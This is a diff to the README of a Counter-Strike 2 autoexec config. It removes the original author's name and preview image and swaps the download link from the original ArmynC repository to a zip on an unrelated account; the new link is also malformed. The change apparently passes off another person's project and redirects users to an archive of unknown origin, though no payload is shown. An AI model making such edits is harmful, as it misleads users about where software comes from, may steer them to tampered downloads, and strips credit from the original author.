@@ -24,16 +24,13 @@
 <tr>
 <td>
   
-**ArminC AutoExec** is a high-quality _config_ for **Counter-Strike 2** that aims to improve the gameplay by enabling you to customize the game settings to your liking through its template system.
+**This AutoExec** is a high-quality _config_ for **Counter-Strike 2** that aims to improve the gameplay by enabling you to customize the game settings to your liking through its template system.
 
 It comes filled with little optimizations such as **network capacity**, overall improving the gameplay for a wide variety of computers and players.
 
 Each and every one of the commands provided are **finely tuned**, enabling the game's full potential compared to default settings.
 
-![ArminC AutoExec Code](https://raw.githubusercontent.com/ArmynC/ArminC-AutoExec/master/arminc_autoexec_code.png)
-<p align="right">
-<sub>(Preview)</sub>
-</p>
+
 
 </td>
 </tr>
@@ -42,7 +39,7 @@ Each and every one of the commands provided are **finely tuned**, enabling the g
 ## Installation
 
 ##### Downloading and installing steps:
-1. **[Download](https://github.com/ArmynC/ArminC-AutoExec/archive/master.zip)** the latest version of the config.
+1. **[Download]([https://github.com/matthewbuildssoftware-art/autoExec//master.zip)** the latest version of the config.
 2.  Open the _archive_ and **extract** the contents of the `cfg` folder into the following path folder:<br>
 `\...\Steam\steamapps\common\Counter-Strike Global Offensive\game\csgo\cfg\`
 3. **Launch** the game and **type** in the _console_ the following command: `exec autoexec.cfg`
